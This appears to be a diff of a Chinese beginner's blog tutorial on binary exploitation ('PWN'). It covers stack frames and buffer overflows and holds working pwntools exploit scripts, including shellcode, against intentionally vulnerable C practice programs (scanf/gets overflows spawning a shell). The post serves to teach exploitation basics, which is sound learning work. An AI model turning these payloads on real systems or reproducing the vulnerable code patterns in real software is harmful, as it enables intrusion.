@@ -1,172 +1,169 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>PWN入门（二） | AssassinQ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="ctfpwn">
-  
-  
-  
-  
-  <meta name="description" content="初涉 PWN。">
-<meta name="keywords" content="ctf,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PWN入门（二）">
-<meta property="og:url" content="blog.b3ale.cn/2018/07/07/PWN入门（二）/index.html">
-<meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="初涉 PWN。">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/1.jpg">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/2.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/3.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/4.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/5.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/6.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/7.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/8.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/9.png">
-<meta property="og:image" content="/pics/BIN集训/PWN/二/10.png">
-<meta property="og:updated_time" content="2019-08-26T05:53:21.579Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN入门（二）">
-<meta name="twitter:description" content="初涉 PWN。">
-<meta name="twitter:image" content="/pics/BIN集训/PWN/二/1.jpg">
-  
-    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/favicon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
-    
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>PWN入门（二） - AssassinQ</title>
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-  <script src="/js/jquery-3.1.1.min.js"></script>
 
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css">
-  <link rel="stylesheet" href="/css/fashion.css">
-  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
 
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
-</html>
 
 
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
 
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-  
-  
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
-
-
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
-            
-          </h1>
-          
-          
-            <div class="site-description">ZJGSU-IS-17</div>
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
-                    
-              </ul>
-            </div>
-          </nav>
-
-      </div>
-  </div>
-</header>
-
-
-  <div id="container">
-    <div id="wrap">
-            
-      <div id="content" class="outer">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <section id="main" style="float:none;"><article id="post-PWN入门（二）" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
         
-  
-    <h1 class="thumb" itemprop="name">
-      PWN入门（二）
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      	<a href="/2018/07/07/PWN入门（二）/" class="article-date">
-	  <time datetime="2018-07-07T05:23:05.000Z" itemprop="datePublished">July 7, 2018</time>
-	</a>
-
-       
-      
-
-	  |
-	  2.2k words
-	  |
-	  8 minute(s) to read
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="article-entry" itemprop="articleBody">
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Saturday, July 7th 2018, 1:23 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      8 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-        <p>初涉 PWN。</p>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>初涉 PWN。</p>
 <a id="more"></a>
 <h1 id="关于-PWN-底层的原理"><a href="#关于-PWN-底层的原理" class="headerlink" title="关于 PWN 底层的原理"></a>关于 PWN 底层的原理</h1><h2 id="栈帧平衡"><a href="#栈帧平衡" class="headerlink" title="栈帧平衡"></a>栈帧平衡</h2><p>一些基本内容：</p>
 <ul>
@@ -181,18 +178,25 @@
 <li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置</li>
 </ul>
 <p>如何保证栈帧平衡：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值</span><br><span class="line">MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧</span><br><span class="line"></span><br><span class="line">XXXXXX // 函数中间部分</span><br><span class="line"></span><br><span class="line">MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间</span><br><span class="line">POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧</span><br></pre></td></tr></table></figure>
-<p><img src="/pics/BIN集训/PWN/二/1.jpg" alt="调用函数后，会先保留旧的栈帧并建立新的栈帧（这里栈底在上，栈顶在下）"></p>
+<pre><code class="asm">PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值
+MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧
+
+XXXXXX // 函数中间部分
+
+MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间
+POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧
+</code></pre>
+<p><img src="/pics/BIN集训/PWN/二/1.jpg" srcset="/img/loading.gif" alt></p>
 <p>函数返回的步骤：</p>
 <ol>
 <li>保存返回值，通常将函数的返回值保存在寄存器 EAX 中。</li>
 <li>弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给 EIP 寄存器。</3></2></1></li>
 <li>跳转：按照函数返回地址跳回母函数中继续执行。</li>
 </ol>
-<p><img src="/pics/BIN集训/PWN/二/2.png" alt="每次调用一个函数都会新增一个栈帧（这里栈底在下，栈顶在上）"></p>
+<p><img src="/pics/BIN集训/PWN/二/2.png" srcset="/img/loading.gif" alt></p>
 <p>PS：栈的守护天使——GS，也称作 Stack Canary/Cookie</p>
-<h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL 可以化为两部分，即<code>Push retaddr + Jump</code>。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p>
-<h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET 也可以转化为两部分，即<code>Pop retaddr + Jump</code>。先是把返回值的地址出栈，再跳转回原本调用函数处。</p>
+<h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL 可以化为两部分，即 <code>Push retaddr + Jump</code>。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p>
+<h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET 也可以转化为两部分，即 <code>Pop retaddr + Jump</code>。先是把返回值的地址出栈，再跳转回原本调用函数处。</p>
 <h1 id="缓冲区溢出（Buffer-Overflow）"><a href="#缓冲区溢出（Buffer-Overflow）" class="headerlink" title="缓冲区溢出（Buffer Overflow）"></a>缓冲区溢出（Buffer Overflow）</h1><p>缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。</p>
 <p>尤其是 C 语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C 语言中的 C 标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</p>
 <h1 id="Linux-下的-Pwn-常用命令"><a href="#Linux-下的-Pwn-常用命令" class="headerlink" title="Linux 下的 Pwn 常用命令"></a>Linux 下的 Pwn 常用命令</h1><table>
@@ -357,227 +361,403 @@
 </table>
 <h1 id="Pwn-的小练习"><a href="#Pwn-的小练习" class="headerlink" title="Pwn 的小练习"></a>Pwn 的小练习</h1><p>第一次做 pwn 题，虽然是在有源码的情况下。但是还是被 pwn 的神奇所震撼。</p>
 <h2 id="p1"><a href="#p1" class="headerlink" title="p1"></a>p1</h2><p>程序源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>输入<code>gcc p1.c -o p1 -m32</code>，用来编译 32 位的程序。</p>
-<h3 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h3><p>根据源文件可以判断该程序调用<code>A()</code>函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。</p>
-<p>根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为<code>cmd()</code>函数的地址，直接跳转到该函数后 getshell。故先通过<code>objdump</code>命令寻找到 cmd 函数的地址</p>
-<p><img src="/pics/BIN集训/PWN/二/3.png" alt="找到cmd函数的地址"></p>
-<p>然后输入<code>gdb p1</code>进入 gdb 调试界面。<code>start</code>开始调试程序。</p>
-<p><img src="/pics/BIN集训/PWN/二/4.png" alt="自上而下分别为寄存器、代码段、栈段"></p>
-<p><img src="/pics/BIN集训/PWN/二/5.png" alt="单步进入A()"></p>
-<p><img src="/pics/BIN集训/PWN/二/6.png" alt="单步执行到scanf后，用pattc命令构造出一段较长的字符"></p>
-<p><img src="/pics/BIN集训/PWN/二/7.png" alt="继续单步执行，程序报错返回RET处的地址"></p>
-<p><img src="/pics/BIN集训/PWN/二/8.png" alt="使用patto命令查找得到偏移量"></p>
-<p>已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至<code>cmd()</code>函数处。</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void vmd()
+{
+    system(&quot;sh&quot;);
+}
+void A()
+{
+    char a[100];
+    scanf(&quot;%s&quot;,a);
+    return;
+}
+int main(){
+    A();
+}
+</code></pre>
+<p>输入 <code>gcc p1.c -o p1 -m32</code>，用来编译 32 位的程序。</p>
+<h3 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h3><p>根据源文件可以判断该程序调用 <code>A()</code> 函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。</p>
+<p>根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为 <code>cmd()</code> 函数的地址，直接跳转到该函数后 getshell。故先通过 <code>objdump</code> 命令寻找到 cmd 函数的地址</p>
+<p><img src="/pics/BIN集训/PWN/二/3.png" srcset="/img/loading.gif" alt></p>
+<p>然后输入 <code>gdb p1</code> 进入 gdb 调试界面。<code>start</code> 开始调试程序。</p>
+<p><img src="/pics/BIN集训/PWN/二/4.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/pics/BIN集训/PWN/二/5.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/pics/BIN集训/PWN/二/6.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/pics/BIN集训/PWN/二/7.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/pics/BIN集训/PWN/二/8.png" srcset="/img/loading.gif" alt></p>
+<p>已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至 <code>cmd()</code> 函数处。</p>
 <p>payload 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">112</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+payload = &quot;A&quot; * 112 + &quot;\x6b\x84\x04\x08&quot;
+p = process(&quot;./p1&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
 <h3 id="Ret-slide"><a href="#Ret-slide" class="headerlink" title="Ret_slide"></a><strong>Ret_slide</strong></h3><p>在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置 payload 减少尝试次数。即 RET 前的字符串利用其他 RET 地址来填充。</p>
 <p>因为 RET 相当于 POP 和 JMP 两个步骤，每次 RET 都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。</p>
 <p>payload：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"\x08\x04\x84\xa0"</span> * <span class="number">28</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+payload = &quot;\x08\x04\x84\xa0&quot; * 28 + &quot;\x6b\x84\x04\x08&quot;
+p = process(&quot;./p1&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
 <h2 id="3-13"><a href="#3-13" class="headerlink" title="3-13"></a>3-13</h2><p>程序源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    srand(time(<span class="number">0</span>) ^ getpid());</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> magic = rand();</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">if</span> (atoi(buf) == magic) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Okay..."</span>);</span><br><span class="line">        system(<span class="string">"sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>同样输入<code>gcc 3-13.c -o 3-13 -m32</code>来编译。</p>
-<p>调试一开始发现权限不够，通过<code>chmod +x 3-13</code>来获得可执行权限。</p>
-<p><img src="/pics/BIN集训/PWN/二/9.png" alt="修改权限"></p>
-<p>源代码中使用了<code>gets()</code>函数，存在缓存区溢出，故第一个想法应该就是通过对变量<code>buf</code>操作使其覆盖变量<code>magic</code>的值，使两者相同后得到 shell。</p>
-<p><code>buf</code>被定义为一个占 100 字节的字符串，而<code>magic</code>被定义为一个占 4 字节的整型。</p>
-<p><img src="/pics/BIN集训/PWN/二/10.png" alt="左侧文本记录了在调试过程中记录下的两个变量的地址"></p>
-<p>根据调试过程可以知道，<code>buf</code>的地址为 0xffffcf68，而<code>magic</code>的地址为 0xffffcfcc。<code>buf</code>的地址比<code>magic</code>的地址更低，两者在栈中显然是先压入<code>magic</code>再压入<code>buf</code>。又因为输入数据是从低位向高位输入，那么我们可以通过变化<code>buf</code>的值来覆盖<code>magic</code>的值。最简单的方法显然是让两者都等于零。</p>
-<p>根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量<code>magic</code>。</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void A()
+{
+    setvbuf(stdout, 0, _IONBF, 0);
+    srand(time(0) ^ getpid());
+    char buf[100];
+    int magic = rand();
+    gets(buf);
+    if (atoi(buf) == magic) {
+        puts(&quot;Okay...&quot;);
+        system(&quot;sh&quot;);
+    }
+}
+int main(){
+    A();
+}
+</code></pre>
+<p>同样输入 <code>gcc 3-13.c -o 3-13 -m32</code> 来编译。</p>
+<p>调试一开始发现权限不够，通过 <code>chmod +x 3-13</code> 来获得可执行权限。</p>
+<p><img src="/pics/BIN集训/PWN/二/9.png" srcset="/img/loading.gif" alt></p>
+<p>源代码中使用了 <code>gets()</code> 函数，存在缓存区溢出，故第一个想法应该就是通过对变量 <code>buf</code> 操作使其覆盖变量 <code>magic</code> 的值，使两者相同后得到 shell。</p>
+<p><code>buf</code> 被定义为一个占 100 字节的字符串，而 <code>magic</code> 被定义为一个占 4 字节的整型。</p>
+<p><img src="/pics/BIN集训/PWN/二/10.png" srcset="/img/loading.gif" alt></p>
+<p>根据调试过程可以知道，<code>buf</code> 的地址为 0xffffcf68，而 <code>magic</code> 的地址为 0xffffcfcc。<code>buf</code> 的地址比 <code>magic</code> 的地址更低，两者在栈中显然是先压入 <code>magic</code> 再压入 <code>buf</code>。又因为输入数据是从低位向高位输入，那么我们可以通过变化 <code>buf</code> 的值来覆盖 <code>magic</code> 的值。最简单的方法显然是让两者都等于零。</p>
+<p>根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量 <code>magic</code>。</p>
 <p>故 payload 为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./3-13'</span>)</span><br><span class="line">payload = <span class="string">'\0'</span> * <span class="number">104</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>这里的<code>\0</code>也就是<code>\x00</code>，而如果输入的是字符<code>0</code>，转为十六进制后为<code>\x30</code>，将不能满足条件，无法 getshell。</p>
+<pre><code class="python">from pwn import *
+p = process(&#39;./3-13&#39;)
+payload = &#39;\0&#39; * 104
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>这里的 <code>\0</code> 也就是 <code>\x00</code>，而如果输入的是字符 <code>0</code>，转为十六进制后为 <code>\x30</code>，将不能满足条件，无法 getshell。</p>
 <p>这题附上梅大佬的 payload，这里可以放 shellcode：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset=<span class="number">116</span></span><br><span class="line">r=process(<span class="string">"3-13"</span>)</span><br><span class="line">elf=ELF(<span class="string">"3-13"</span>)</span><br><span class="line">bss=elf.bss()</span><br><span class="line">get=elf.symbols[<span class="string">'gets'</span>]</span><br><span class="line">shell=<span class="string">"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c"</span></span><br><span class="line">payload=<span class="string">"A"</span>*offset+p32(get)+p32(bss)+p32(bss)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shell)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span 